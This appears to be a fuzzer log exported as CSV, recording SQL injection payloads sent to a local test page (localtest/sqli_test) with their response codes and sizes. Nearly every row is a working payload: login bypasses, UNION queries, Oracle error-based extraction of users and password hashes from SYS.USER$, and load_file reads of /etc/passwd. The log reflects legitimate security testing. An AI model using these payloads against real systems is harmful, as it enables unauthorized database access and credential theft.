Identificación de pestaña,Tipo de mensaje,Petición (Tiempo),Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Pregunta,Tamaño Cuerpo de Petición,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo),Alerta mayor,Estado,Cargas Útiles
201,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,13,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i]"
206,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(USERNAME)%20FROM%20(SELECT%20DISTINCT(USERNAME),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,11,638,0,227,505,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i]"
205,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,8,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i]"
207,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(PASSWORD)%20FROM%20(SELECT%20DISTINCT(PASSWORD),%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER$)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,15,634,0,227,501,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i]"
208,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(table_name)%20FROM%20(SELECT%20DISTINCT(table_name),%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,9,643,0,227,506,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i]"
209,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,10,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i]"
204,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(column_name)%20FROM%20(SELECT%20DISTINCT(column_name),%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns)%20WHERE%20LIMIT=7))%20AND%20'i'='i&password=prueba",200,OK,29,646,0,227,507,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i]"
212,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%7C%7C6&password=prueba,200,OK,10,457,0,227,345,,,[||6]
213,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%7C%7C'6&password=prueba,200,OK,10,459,0,227,345,,,['||'6]
211,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%7C%7C(elt(-3+5,bin(15),ord(10),hex(char(45))))&password=prueba",200,OK,16,498,0,227,486,,,"['||(elt(-3+5,bin(15),ord(10),hex(char(45))))]"
210,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20AND%201=utl_inaddr.get_host_address((SELECT%20DISTINCT(granted_role)%20FROM%20(SELECT%20DISTINCT(granted_role),%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE=SYS.LOGINUSER)%20WHERE%20LIMIT=8))%20AND%20'i'='i&password=prueba",200,OK,17,679,0,227,510,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i]"
214,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=(%7C%7C6)&password=prueba,200,OK,7,459,0,227,345,,,[(||6)]
217,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'1'='1&password=prueba,200,OK,9,465,0,227,345,,,[' or '1'='1]
216,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=or%201=1&password=prueba,200,OK,10,458,0,227,345,,,[or 1=1]
215,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1--%20&password=prueba,200,OK,15,467,0,227,327,,,[' or 1=1-- ]
218,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=;%20or%20'1'='1'&password=prueba,200,OK,15,466,0,227,459,,,[; or '1'='1']
220,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'7659'='7659&password=prueba,200,OK,17,471,0,227,345,,,[' or '7659'='7659]
221,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,19,477,0,227,345,,,"["" or isNULL(1/0) /*]"
219,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,14,477,0,227,345,,,"["" or isNULL(1/0) /*]"
222,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20--%20&password=prueba,200,OK,14,459,0,227,345,,,[' -- ]
224,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%201=1--&password=prueba,200,OK,15,466,0,227,345,,,"["" or 1=1--]"
223,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1--&password=prueba,200,OK,17,464,0,227,437,,,[' or 1=1--]
227,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'a'='a&password=prueba,200,OK,14,465,0,227,345,,,[' or 'a'='a]
226,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=or%201=1--&password=prueba,200,OK,19,460,0,227,345,,,[or 1=1--]
225,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1%20/*&password=prueba,200,OK,15,467,0,227,455,,,[' or 1=1 /*]
231,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20select%20*%20from%20information_schema.tables--&password=prueba,200,OK,7,501,0,227,494,,,[' select * from information_schema.tables--]
229,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=')%20or%20('a'='a&password=prueba,200,OK,7,467,0,227,465,,Reflejado,[') or ('a'='a]
228,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20%22a%22=%22a&password=prueba,200,OK,7,473,0,227,345,,,"["" or ""a""=""a]"
230,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=admin'%20or%20'&password=prueba,200,OK,8,465,0,227,327,,,[admin' or ']
234,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20having%201=1--&password=prueba,200,OK,13,468,0,227,437,,,[' having 1=1--]
236,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20select%20name%20from%20syscolumns%20where%20id%20=%20(select%20id%20from%20sysobjects%20where%20name%20=%20tablename')--&password=prueba,200,OK,18,574,0,227,510,,,[' select name from syscolumns where id = (select id from sysobjects where name = tablename')--]
233,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20having%201=1--&password=prueba,200,OK,29,468,0,227,437,,,[' having 1=1--]
235,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20group%20by%20userid%20having%201=1--&password=prueba,200,OK,24,490,0,227,437,,,[' group by userid having 1=1--]
232,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=)%20union%20select%20*%20from%20information_schema.tables;&password=prueba,200,OK,28,508,0,227,345,,,[) union select * from information_schema.tables;]
237,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201%20in%20(select%20@@version)--&password=prueba,200,OK,8,490,0,227,455,,,[' or 1 in (select @@version)--]
240,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'something'%20=%20'some'+'thing'&password=prueba,200,OK,20,491,0,227,437,,,[' or 'something' = 'some'+'thing']
239,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'unusual'%20=%20'unusual'&password=prueba,200,OK,24,484,0,227,437,,,[' or 'unusual' = 'unusual']
238,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20all%20select%20@@version--&password=prueba,200,OK,24,488,0,227,431,,,[' union all select @@version--]
241,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'text'%20=%20n'text'&password=prueba,200,OK,17,479,0,227,437,,,[' or 'text' = n'text']
245,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'whatever'%20in%20('whatever')&password=prueba,200,OK,10,489,0,227,453,,,[' or 'whatever' in ('whatever')]
244,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'text'%20%3E%20't'&password=prueba,200,OK,14,477,0,227,437,,,[' or 'text' > 't']
243,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%202%20%3E%201&password=prueba,200,OK,12,470,0,227,453,,,[' or 2 > 1]
247,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20username%20like%20char(37);&password=prueba,200,OK,5,486,0,227,453,,,[' or username like char(37);]
242,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'something'%20like%20'some%25'&password=prueba,200,OK,16,489,0,227,437,,,[' or 'something' like 'some%']
246,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%202%20between%201%20and%203&password=prueba,200,OK,8,484,0,227,453,,,[' or 2 between 1 and 3]
250,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=password:*/=1--&password=prueba,200,OK,10,465,0,227,345,,,[password:*/=1--]
249,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20select%20&password=prueba,200,OK,18,471,0,227,431,,,[' union select ]
248,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20select%20*%20from%20users%20where%20login%20=%20char(114,111,111,116);&password=prueba",200,OK,4,532,0,227,453,,,"[' union select * from users where login = char(114,111,111,116);]"
251,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=uni/**/on%20sel/**/ect&password=prueba,200,OK,15,472,0,227,345,,,[uni/**/on sel/**/ect]
252,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20execute%20immediate%20'sel'%20%7C%7C%20'ect%20us'%20%7C%7C%20'er'&password=prueba,200,OK,16,520,0,227,496,,,['; execute immediate 'sel' || 'ect us' || 'er']
254,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='/**/or/**/1/**/=/**/1&password=prueba,200,OK,23,472,0,227,453,,,['/**/or/**/1/**/=/**/1]
253,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20exec%20('sel'%20+%20'ect%20us'%20+%20'er')&password=prueba,200,OK,6,497,0,227,483,,,['; exec ('sel' + 'ect us' + 'er')]
255,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201/*&password=prueba,200,OK,15,462,0,227,455,,,[' or 1/*]
256,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,14,474,0,227,345,,,[ or isNULL(1/0) /*]
257,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'7659'='7659&password=prueba,200,OK,9,471,0,227,345,,,[' or '7659'='7659]
258,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,10,477,0,227,345,,,"["" or isNULL(1/0) /*]"
260,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20begin%20declare%20@var%20varchar(8000)%20set%20@var=':'%20select%20@var=@var+'+login+'/'+password+'%20'%20from%20users%20where%20login%20%3E%20&password=prueba,200,OK,10,598,0,227,510,,,['; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ]
259,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20--%20&password=&password=prueba,200,OK,12,469,0,227,345,,,[' -- &password=]
262,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20and%201%20in%20(select%20var%20from%20temp)--&password=prueba,200,OK,16,499,0,227,455,,,[' and 1 in (select var from temp)--]
261,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=@var%20select%20@var%20as%20var%20into%20temp%20end%20--&password=prueba,200,OK,23,506,0,227,345,,,[@var select @var as var into temp end --]
263,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20select%201,load_file('/etc/passwd'),1,1,1;&password=prueba",200,OK,12,504,0,227,453,,,"[' union select 1,load_file('/etc/passwd'),1,1,1;]"
265,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20and%201=(%20if((load_file(char(110,46,101,120,116))%3C%3Echar(39,39)),1,0));&password=prueba",200,OK,9,530,0,227,453,,,"[' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));]"
266,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%7C%7C(elt(-3+5,bin(15),ord(10),hex(char(45))))&password=prueba",200,OK,11,498,0,227,486,,,"['||(elt(-3+5,bin(15),ord(10),hex(char(45))))]"
268,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%7C%7C'6&password=prueba,200,OK,8,459,0,227,345,,,['||'6]
267,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%7C%7C6&password=prueba,200,OK,16,457,0,227,345,,,[||6]
264,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;&password=prueba",200,OK,15,517,0,227,345,,,"[1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;]"
269,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=(%7C%7C6)&password=prueba,200,OK,7,459,0,227,345,,,[(||6)]
270,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1--%20&password=prueba,200,OK,6,467,0,227,327,,,[' or 1=1-- ]
273,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=;%20or%20'1'='1'&password=prueba,200,OK,13,466,0,227,459,,,[; or '1'='1']
272,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'1'='1&password=prueba,200,OK,11,465,0,227,345,,,[' or '1'='1]
271,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=or%201=1&password=prueba,200,OK,9,458,0,227,345,,,[or 1=1]
275,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'7659'='7659&password=prueba,200,OK,7,471,0,227,345,,,[' or '7659'='7659]
274,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,13,477,0,227,345,,,"["" or isNULL(1/0) /*]"
276,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,36,477,0,227,345,,,"["" or isNULL(1/0) /*]"
279,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%201=1--&password=prueba,200,OK,8,466,0,227,345,,,"["" or 1=1--]"
280,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1%20/*&password=prueba,200,OK,8,467,0,227,455,,,[' or 1=1 /*]
278,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201=1--&password=prueba,200,OK,28,464,0,227,437,,,[' or 1=1--]
277,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20--%20&password=prueba,200,OK,25,459,0,227,345,,,[' -- ]
281,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=or%201=1--&password=prueba,200,OK,6,460,0,227,345,,,[or 1=1--]
285,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=admin'%20or%20'&password=prueba,200,OK,5,465,0,227,327,,,[admin' or ']
283,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20%22a%22=%22a&password=prueba,200,OK,10,473,0,227,345,,,"["" or ""a""=""a]"
282,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'a'='a&password=prueba,200,OK,5,465,0,227,345,,,[' or 'a'='a]
284,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=')%20or%20('a'='a&password=prueba,200,OK,5,467,0,227,465,,Reflejado,[') or ('a'='a]
287,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=)%20union%20select%20*%20from%20information_schema.tables;&password=prueba,200,OK,18,508,0,227,345,,,[) union select * from information_schema.tables;]
286,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20select%20*%20from%20information_schema.tables--&password=prueba,200,OK,13,501,0,227,494,,,[' select * from information_schema.tables--]
289,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20having%201=1--&password=prueba,200,OK,13,468,0,227,437,,,[' having 1=1--]
288,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20having%201=1--&password=prueba,200,OK,19,468,0,227,437,,,[' having 1=1--]
291,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20select%20name%20from%20syscolumns%20where%20id%20=%20(select%20id%20from%20sysobjects%20where%20name%20=%20tablename')--&password=prueba,200,OK,18,574,0,227,510,,,[' select name from syscolumns where id = (select id from sysobjects where name = tablename')--]
290,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20group%20by%20userid%20having%201=1--&password=prueba,200,OK,21,490,0,227,437,,,[' group by userid having 1=1--]
294,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'unusual'%20=%20'unusual'&password=prueba,200,OK,14,484,0,227,437,,,[' or 'unusual' = 'unusual']
293,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20all%20select%20@@version--&password=prueba,200,OK,9,488,0,227,431,,,[' union all select @@version--]
292,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201%20in%20(select%20@@version)--&password=prueba,200,OK,18,490,0,227,455,,,[' or 1 in (select @@version)--]
295,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'something'%20=%20'some'+'thing'&password=prueba,200,OK,3,491,0,227,437,,,[' or 'something' = 'some'+'thing']
298,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%202%20%3E%201&password=prueba,200,OK,9,470,0,227,453,,,[' or 2 > 1]
300,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'whatever'%20in%20('whatever')&password=prueba,200,OK,13,489,0,227,453,,,[' or 'whatever' in ('whatever')]
297,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'something'%20like%20'some%25'&password=prueba,200,OK,8,489,0,227,437,,,[' or 'something' like 'some%']
296,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'text'%20=%20n'text'&password=prueba,200,OK,8,479,0,227,437,,,[' or 'text' = n'text']
299,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'text'%20%3E%20't'&password=prueba,200,OK,6,477,0,227,437,,,[' or 'text' > 't']
302,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20username%20like%20char(37);&password=prueba,200,OK,13,486,0,227,453,,,[' or username like char(37);]
303,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,"http://localtest/sqli_test/index.php?username='%20union%20select%20*%20from%20users%20where%20login%20=%20char(114,111,111,116);&password=prueba",200,OK,7,532,0,227,453,,,"[' union select * from users where login = char(114,111,111,116);]"
304,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20union%20select%20&password=prueba,200,OK,7,471,0,227,431,,,[' union select ]
305,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=password:*/=1--&password=prueba,200,OK,4,465,0,227,345,,,[password:*/=1--]
301,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%202%20between%201%20and%203&password=prueba,200,OK,11,484,0,227,453,,,[' or 2 between 1 and 3]
308,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20exec%20('sel'%20+%20'ect%20us'%20+%20'er')&password=prueba,200,OK,12,497,0,227,483,,,['; exec ('sel' + 'ect us' + 'er')]
307,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20execute%20immediate%20'sel'%20%7C%7C%20'ect%20us'%20%7C%7C%20'er'&password=prueba,200,OK,20,520,0,227,496,,,['; execute immediate 'sel' || 'ect us' || 'er']
306,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=uni/**/on%20sel/**/ect&password=prueba,200,OK,13,472,0,227,345,,,[uni/**/on sel/**/ect]
309,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='/**/or/**/1/**/=/**/1&password=prueba,200,OK,13,472,0,227,453,,,['/**/or/**/1/**/=/**/1]
310,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%201/*&password=prueba,200,OK,28,462,0,227,455,,,[' or 1/*]
313,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%22%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,16,477,0,227,345,,,"["" or isNULL(1/0) /*]"
312,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20or%20'7659'='7659&password=prueba,200,OK,19,471,0,227,345,,,[' or '7659'='7659]
311,Fuzzed,Wed Sep 10 16:48:27 CEST 2025,GET,http://localtest/sqli_test/index.php?username=%20or%20isNULL(1/0)%20/*&password=prueba,200,OK,15,474,0,227,345,,,[ or isNULL(1/0) /*]
